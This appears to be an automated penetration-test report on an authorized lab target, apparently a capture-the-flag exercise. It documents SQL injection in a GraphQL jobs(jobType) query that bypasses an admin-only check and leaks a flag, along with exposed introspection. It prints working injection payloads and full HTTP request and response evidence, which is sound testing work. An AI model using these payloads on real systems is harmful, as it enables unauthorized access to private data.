# VERDICT Security Assessment Report

## Contents

- [Assessment Information](#assessment-information)
- [Scope](#scope)
- [Summary](#summary)
- [Findings](#findings)
    - [1. CRITICAL — sqli SQL injection in GraphQL jobs(jobType) — auth filter bypass, private data disclosure](#finding-1)
    - [2. HIGH — info-disclosure Unauthenticated disclosure of admin-only private job (live secret/flag) by bypassing the "admins only" guard via SQLi on jobType](#finding-2)
    - [3. LOW — info-disclosure GraphQL introspection enabled + GraphiQL IDE exposed on unauthenticated /graphql](#finding-3)

## Assessment Information

| | |
|---|---|
| Assessment ID | `a-mqy34r1n-oay9rf` |
| Target | http://target.local:32820/ |
| Started | 2026-06-28T17:51:01.586Z |
| Generated | 2026-07-02T00:00:00.000Z |
| Phase | report |
| Screens | 2 mapped · 2 scanned · 0 remaining |
| Hypotheses | 0 (0 confirmed) |
| Findings | 3 |
| Tooling | VERDICT |

## Scope

- **In-scope hosts**: `target.local:32820`
- **Out-of-scope hosts**: —
- **In-scope paths**: `/`
- **Out-of-scope paths**: —
- **Rate**: 30 req/min, max 2 concurrent

## Summary

3 finding(s): 1 critical, 1 high, 1 low

## Findings

<a id="finding-1"></a>

### 1. [CRITICAL] [sqli] SQL injection in GraphQL jobs(jobType) — auth filter bypass, private data disclosure

- Screen: `s-0001`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32820/

The `jobType` argument of the GraphQL `jobs(jobType: String!)` query (driven by the root-page job-type filter) is concatenated directly into a SQLite query without parameterization. A single quote payload returns a SQLite parser error ("unrecognized token: \"'''\""), proving string-context concatenation. A boolean payload `' OR '1'='1` causes the WHERE clause to match every row, returning ALL jobs — including the `private` "Hidden job" whose description contains a secret flag. This simultaneously (a) confirms SQL injection and (b) bypasses the application-level access control that otherwise rejects jobType="private" with "Only admins can see private jobs". Unauthenticated. The GraphiQL playground is also exposed unauthenticated at /graphql/, easing exploitation.

**Reproduction**

```
1. POST http://target.local:32820/graphql/ with Content-Type: application/json and body {"query":"{jobs(jobType:\"zzznomatch\"){id name type description}}"} → returns {"data":{"jobs":[]}} (negative control: no rows).
2. POST same endpoint with body {"query":"{jobs(jobType:\"' OR '1'='1\"){id name type description}}"} → returns all 4 jobs including {"id":3,"name":"Hidden job","type":"private","description":"flag{3c8f1e0c-ed42-4e5f-a038-61d9c40b9fc9}"}, despite jobType="private" being explicitly blocked for non-admins.
3. Replay step 2 → identical full result set (stable).
Single-quote confirmation: jobType="'" → {"errors":[{"message":"unrecognized token: \"'''\""}]} (SQLite error).
```

**Evidence**

- Evidence `ev-mqy395ez-a` — `artifacts/s-0001/ev-mqy395ez-a/`

Request:

```http
POST /graphql/ HTTP/1.1
Host: target.local:32820
user-agent: verdict-scanner/0.1
x-verdict: assessment
content-type: application/json

{"query":"{jobs(jobType:\"zzznomatch\"){id name type description}}"}
```

Response:

```http
HTTP/1.1 200
content-length: 22
content-type: application/json
date: Sun, 28 Jun 2026 17:54:25 GMT
server: uvicorn

{"data": {"jobs": []}}
```

- Evidence `ev-mqy3948h-9` — `artifacts/s-0001/ev-mqy3948h-9/`

Request:

```http
POST /graphql/ HTTP/1.1
Host: target.local:32820
user-agent: verdict-scanner/0.1
x-verdict: assessment
content-type: application/json

{"query":"{jobs(jobType:\"' OR '1'='1\"){id name type description}}"}
```

Response:

```http
HTTP/1.1 200
content-length: 392
content-type: application/json
date: Sun, 28 Jun 2026 17:54:24 GMT
server: uvicorn

{"data": {"jobs": [{"id": 1, "name": "Senior Frontend Dev", "type": "front-end", "description": "reactjs"}, {"id": 2, "name": "Staff Backend Python", "type": "back-end", "description": "django"}, {"id": 3, "name": "Hidden job", "type": "private", "description": "flag{3c8f1e0c-ed42-4e5f-a038-61d9c40b9fc9}"}, {"id": 4, "name": "Frontend Dev", "type": "front-end", "description": "angular"}]}}
```

- Evidence `ev-mqy39bkw-b` — `artifacts/s-0001/ev-mqy39bkw-b/`

Request:

```http
POST /graphql/ HTTP/1.1
Host: target.local:32820
user-agent: verdict-scanner/0.1
x-verdict: assessment
content-type: application/json

{"query":"{jobs(jobType:\"' OR '1'='1\"){id name type description}}"}
```

Response:

```http
HTTP/1.1 200
content-length: 392
content-type: application/json
date: Sun, 28 Jun 2026 17:54:33 GMT
server: uvicorn

{"data": {"jobs": [{"id": 1, "name": "Senior Frontend Dev", "type": "front-end", "description": "reactjs"}, {"id": 2, "name": "Staff Backend Python", "type": "back-end", "description": "django"}, {"id": 3, "name": "Hidden job", "type": "private", "description": "flag{3c8f1e0c-ed42-4e5f-a038-61d9c40b9fc9}"}, {"id": 4, "name": "Frontend Dev", "type": "front-end", "description": "angular"}]}}
```

<a id="finding-2"></a>

### 2. [HIGH] [info-disclosure] Unauthenticated disclosure of admin-only private job (live secret/flag) by bypassing the "admins only" guard via SQLi on jobType

- Screen: `(cross-screen)`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32820/

The `jobs(jobType: String!)` GraphQL query enforces an authorization boundary at the resolver: requesting `jobType:"private"` is rejected with {"errors":[{"message":"Only admins can see private jobs"}]} and returns no data (negative control ev-mqy3gwlg-t, 135 bytes, data=null). However the resolver concatenates `jobType` into its SQL, so the guard is merely a literal-string check on the value "private". An UNAUTHENTICATED attacker injects a boolean-true predicate (`zzz' OR 1=1-- -`) that (a) never equals the literal "private" so the admin guard is not triggered, yet (b) forces the underlying SQL to return ALL rows — including the admin-only private record (id 3, "Hidden job", type "private"). Its description leaks a real, live, in-scope secret: flag{3c8f1e0c-ed42-4e5f-a038-61d9c40b9fc9}. This is the sensitive-data-disclosure impact (admin-only data exfiltrated by an unauthenticated user), distinct from the raw injection finding (sqli::/graphql::jobType) and from the introspection misconfig.

**Reproduction**

```
1. Negative control (guard works): POST /graphql/ with body {"query":"{ jobs(jobType:\"private\"){id name type description} }"} → 200, data=null, error "Only admins can see private jobs" (ev-mqy3gwlg-t, 135 bytes).
2. Exploit: POST /graphql/ with body {"query":"{ jobs(jobType:\"zzz' OR 1=1-- -\"){id name type description} }"} → 200, returns 4 jobs incl. id 3 type "private" with description flag{3c8f1e0c-ed42-4e5f-a038-61d9c40b9fc9} (ev-mqy3i7z1-w and ev-mqy3i90s-x, both 392 bytes, stable across replays).
The injected predicate is never literally "private" so the admin guard is skipped, while OR 1=1 forces the protected row to be returned. No authentication or admin role required.
```

**Evidence**

- Evidence `ev-mqy3gwlg-t` — `artifacts/_/ev-mqy3gwlg-t/`

Request:

```http
POST /graphql/ HTTP/1.1
Host: target.local:32820
user-agent: verdict-scanner/0.1
x-verdict: assessment
Content-Type: application/json

{"query":"{ all: jobs(jobType:\"\"){id name type description} priv: jobs(jobType:\"private\"){id name type description} }"}
```

Response:

```http
HTTP/1.1 200
content-length: 135
content-type: application/json
date: Sun, 28 Jun 2026 18:00:27 GMT
server: uvicorn

{"data": null, "errors": [{"message": "Only admins can see private jobs", "locations": [{"line": 1, "column": 51}], "path": ["priv"]}]}
```

- Evidence `ev-mqy3i7z1-w` — `artifacts/_/ev-mqy3i7z1-w/`

Request:

```http
POST /graphql/ HTTP/1.1
Host: target.local:32820
user-agent: verdict-scanner/0.1
x-verdict: assessment
Content-Type: application/json

{"query":"{ jobs(jobType:\"zzz' OR 1=1-- -\"){id name type description} }"}
```

Response:

```http
HTTP/1.1 200
content-length: 392
content-type: application/json
date: Sun, 28 Jun 2026 18:01:29 GMT
server: uvicorn

{"data": {"jobs": [{"id": 1, "name": "Senior Frontend Dev", "type": "front-end", "description": "reactjs"}, {"id": 2, "name": "Staff Backend Python", "type": "back-end", "description": "django"}, {"id": 3, "name": "Hidden job", "type": "private", "description": "flag{3c8f1e0c-ed42-4e5f-a038-61d9c40b9fc9}"}, {"id": 4, "name": "Frontend Dev", "type": "front-end", "description": "angular"}]}}
```

- Evidence `ev-mqy3i90s-x` — `artifacts/_/ev-mqy3i90s-x/`

Request:

```http
POST /graphql/ HTTP/1.1
Host: target.local:32820
user-agent: verdict-scanner/0.1
x-verdict: assessment
Content-Type: application/json

{"query":"{ jobs(jobType:\"zzz' OR 1=1-- -\"){id name type description} }"}
```

Response:

```http
HTTP/1.1 200
content-length: 392
content-type: application/json
date: Sun, 28 Jun 2026 18:01:30 GMT
server: uvicorn

{"data": {"jobs": [{"id": 1, "name": "Senior Frontend Dev", "type": "front-end", "description": "reactjs"}, {"id": 2, "name": "Staff Backend Python", "type": "back-end", "description": "django"}, {"id": 3, "name": "Hidden job", "type": "private", "description": "flag{3c8f1e0c-ed42-4e5f-a038-61d9c40b9fc9}"}, {"id": 4, "name": "Frontend Dev", "type": "front-end", "description": "angular"}]}}
```

<a id="finding-3"></a>

### 3. [LOW] [info-disclosure] GraphQL introspection enabled + GraphiQL IDE exposed on unauthenticated /graphql

- Screen: `s-0002`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32820/

The unauthenticated POST /graphql/ endpoint (Strawberry GraphQL) has introspection fully enabled, disclosing the complete schema to any anonymous client: Query.jobs(jobType: String!): [Job] and the Job object type (id, name, type, description); mutationType and subscriptionType are null. In addition, GET /graphql/ serves the interactive GraphiQL IDE unauthenticated. Schema disclosure is the reconnaissance primitive that directly reveals the jobType scalar argument exploited by the confirmed SQL injection (sqli::/graphql::jobType) and would expose any future resolvers/arguments to attackers. Defense-in-depth: production GraphQL endpoints should disable introspection and the GraphiQL IDE.

**Reproduction**

```
1. POST http://target.local:32820/graphql/ with header Content-Type: application/json and body {"query":"{__schema{queryType{name} mutationType{name} types{name kind fields{name args{name type{name kind ofType{name kind}}}}}}"} → 200, full schema returned (data.__schema populated) [ev-mqy3bbcg-i, ev-mqy3dpft-m].
2. Negative control — request a non-existent introspection field {"query":"{__schema{__nonexistent_field_xyz}}"} → 200 with data:null and a validation error, no schema disclosed [ev-mqy3d9lo-l].
3. GET http://target.local:32820/graphql/ → 200 text/html serving the Strawberry GraphiQL IDE unauthenticated [ev-mqy3bc13-j].
```

**Evidence**

- Evidence `ev-mqy3d9lo-l` — `artifacts/s-0002/ev-mqy3d9lo-l/`

Request:

```http
POST /graphql/ HTTP/1.1
Host: target.local:32820
user-agent: verdict-scanner/0.1
x-verdict: assessment
content-type: application/json

{"query":"{__schema{__nonexistent_field_xyz}}"}
```

Response:

```http
HTTP/1.1 200
content-length: 149
content-type: application/json
date: Sun, 28 Jun 2026 17:57:37 GMT
server: uvicorn

{"data": null, "errors": [{"message": "Cannot query field '__nonexistent_field_xyz' on type '__Schema'.", "locations": [{"line": 1, "column": 11}]}]}
```

- Evidence `ev-mqy3bbcg-i` — `artifacts/s-0002/ev-mqy3bbcg-i/`

Request:

```http
POST /graphql/ HTTP/1.1
Host: target.local:32820
user-agent: verdict-scanner/0.1
x-verdict: assessment
content-type: application/json

{"query":"{__schema{queryType{name} mutationType{name} types{name kind fields{name args{name type{name kind ofType{name kind}}} }}}}"}
```

Response:

```http
HTTP/1.1 200
content-length: 3057
content-type: application/json
date: Sun, 28 Jun 2026 17:56:07 GMT
server: uvicorn

{"data": {"__schema": {"queryType": {"name": "Query"}, "mutationType": null, "types": [{"name": "Query", "kind": "OBJECT", "fields": [{"name": "jobs", "args": [{"name": "jobType", "type": {"name": null, "kind": "NON_NULL", "ofType": {"name": "String", "kind": "SCALAR"}}}]}]}, {"name": "Job", "kind": "OBJECT", "fields": [{"name": "id", "args": []}, {"name": "name", "args": []}, {"name": "type", "args": []}, {"name": "description", "args": []}]}, {"name": "Int", "kind": "SCALAR", "fields": null}, {"name": "String", "kind": "SCALAR", "fields": null}, {"name": "Boolean", "kind": "SCALAR", "fields": null}, {"name": "__Schema", "kind": "OBJECT", "fields": [{"name": "description", "args": []}, {"name": "types", "args": []}, {"name": "queryType", "args": []}, {"name": "mutationType", "args": []}, {"name": "subscriptionType", "args": []}, {"name": "directives", "args": [{"name": "includeDeprecated", "type": {"name": null, "kind": "NON_NULL", "ofType": {"name": "Boolean", "kind": "SCALAR"}}}]}]}, {"name": "__Type", "kind": "OBJECT", "fields": [{"name": "kind", "args": []}, {"name": "name", "args": []}, {"name": "description", "args": []}, {"name": "specifiedByURL", "args": []}, {"name": "fields", "args": [{"name": "includeDeprecated", "type": {"name": "Boolean", "kind": "SCALAR", "ofType": null}}]}, {"name": "interfaces", "args": []}, {"name": "possibleTypes", "args": []}, {"name": "enumValues", "args": [{"name": "includeDeprecated", "type": {"name": "Boolean", "kind": "SCALAR", "ofType": null}}]}, {"name": "inputFields", "args": [{"name": "includeDeprecated", "type": {"name": "Boolean", "kind": "SCALAR", "ofType": null}}]}, {"name": "ofType", "args": []}, {"name": "isOneOf", "args": []}]}, {"name": "__TypeKind", "kind": "ENUM", "fields": null}, {"name": "__Field", "kind": "OBJECT", "fields": [{"name": "name", "args": []}, {"name": "description", "args": []}, {"name": "args", "args": [{"name": "includeDeprecated", "type": {"name": "Boolean", "kind": "SCALAR", "ofType": null}}]}, {"name": "type", "args": []}, {"name": "isDeprecated", "args": []}, {"name": "deprecationReason", "args": []}]}, {"name": "__InputValue", "kind": "OBJECT", "fields": [{"name": "name", "args": []}, {"name": "description", "args": []}, {"name": "type", "args": []}, {"name": "defaultValue", "args": []}, {"name": "isDeprecated", "args": []}, {"name": "deprecationReason", "args": []}]}, {"name": "__EnumValue", "kind": "OBJECT", "fields": [{"name": "name", "args": []}, {"name": "description", "args": []}, {"name": "isDeprecated", "args": []}, {"name": "deprecationReason", "args": []}]}, {"name": "__Directive", "kind": "OBJECT", "fields": [{"name": "name", "args": []}, {"name": "description", "args": []}, {"name": "isRepeatable", "args": []}, {"name": "locations", "args": []}, {"name": "args", "args": [{"name": "includeDeprecated", "type": {"name": "Boolean", "kind": "SCALAR", "ofType": null}}]}, {"name": "isDeprecated", "args": []}, {"name": "deprecationReason", "args": []}]}, {"name": "__DirectiveLocation", "kind": "ENUM", "fields": null}]}}}
```

- Evidence `ev-mqy3dpft-m` — `artifacts/s-0002/ev-mqy3dpft-m/`

Request:

```http
POST /graphql/ HTTP/1.1
Host: target.local:32820
user-agent: verdict-scanner/0.1
x-verdict: assessment
content-type: application/json

{"query":"{__schema{queryType{name} mutationType{name} types{name kind fields{name args{name type{name kind ofType{name kind}}} }}}}"}
```

Response:

```http
HTTP/1.1 200
content-length: 3057
content-type: application/json
date: Sun, 28 Jun 2026 17:57:58 GMT
server: uvicorn

{"data": {"__schema": {"queryType": {"name": "Query"}, "mutationType": null, "types": [{"name": "Query", "kind": "OBJECT", "fields": [{"name": "jobs", "args": [{"name": "jobType", "type": {"name": null, "kind": "NON_NULL", "ofType": {"name": "String", "kind": "SCALAR"}}}]}]}, {"name": "Job", "kind": "OBJECT", "fields": [{"name": "id", "args": []}, {"name": "name", "args": []}, {"name": "type", "args": []}, {"name": "description", "args": []}]}, {"name": "Int", "kind": "SCALAR", "fields": null}, {"name": "String", "kind": "SCALAR", "fields": null}, {"name": "Boolean", "kind": "SCALAR", "fields": null}, {"name": "__Schema", "kind": "OBJECT", "fields": [{"name": "description", "args": []}, {"name": "types", "args": []}, {"name": "queryType", "args": []}, {"name": "mutationType", "args": []}, {"name": "subscriptionType", "args": []}, {"name": "directives", "args": [{"name": "includeDeprecated", "type": {"name": null, "kind": "NON_NULL", "ofType": {"name": "Boolean", "kind": "SCALAR"}}}]}]}, {"name": "__Type", "kind": "OBJECT", "fields": [{"name": "kind", "args": []}, {"name": "name", "args": []}, {"name": "description", "args": []}, {"name": "specifiedByURL", "args": []}, {"name": "fields", "args": [{"name": "includeDeprecated", "type": {"name": "Boolean", "kind": "SCALAR", "ofType": null}}]}, {"name": "interfaces", "args": []}, {"name": "possibleTypes", "args": []}, {"name": "enumValues", "args": [{"name": "includeDeprecated", "type": {"name": "Boolean", "kind": "SCALAR", "ofType": null}}]}, {"name": "inputFields", "args": [{"name": "includeDeprecated", "type": {"name": "Boolean", "kind": "SCALAR", "ofType": null}}]}, {"name": "ofType", "args": []}, {"name": "isOneOf", "args": []}]}, {"name": "__TypeKind", "kind": "ENUM", "fields": null}, {"name": "__Field", "kind": "OBJECT", "fields": [{"name": "name", "args": []}, {"name": "description", "args": []}, {"name": "args", "args": [{"name": "includeDeprecated", "type": {"name": "Boolean", "kind": "SCALAR", "ofType": null}}]}, {"name": "type", "args": []}, {"name": "isDeprecated", "args": []}, {"name": "deprecationReason", "args": []}]}, {"name": "__InputValue", "kind": "OBJECT", "fields": [{"name": "name", "args": []}, {"name": "description", "args": []}, {"name": "type", "args": []}, {"name": "defaultValue", "args": []}, {"name": "isDeprecated", "args": []}, {"name": "deprecationReason", "args": []}]}, {"name": "__EnumValue", "kind": "OBJECT", "fields": [{"name": "name", "args": []}, {"name": "description", "args": []}, {"name": "isDeprecated", "args": []}, {"name": "deprecationReason", "args": []}]}, {"name": "__Directive", "kind": "OBJECT", "fields": [{"name": "name", "args": []}, {"name": "description", "args": []}, {"name": "isRepeatable", "args": []}, {"name": "locations", "args": []}, {"name": "args", "args": [{"name": "includeDeprecated", "type": {"name": "Boolean", "kind": "SCALAR", "ofType": null}}]}, {"name": "isDeprecated", "args": []}, {"name": "deprecationReason", "args": []}]}, {"name": "__DirectiveLocation", "kind": "ENUM", "fields": null}]}}}
```
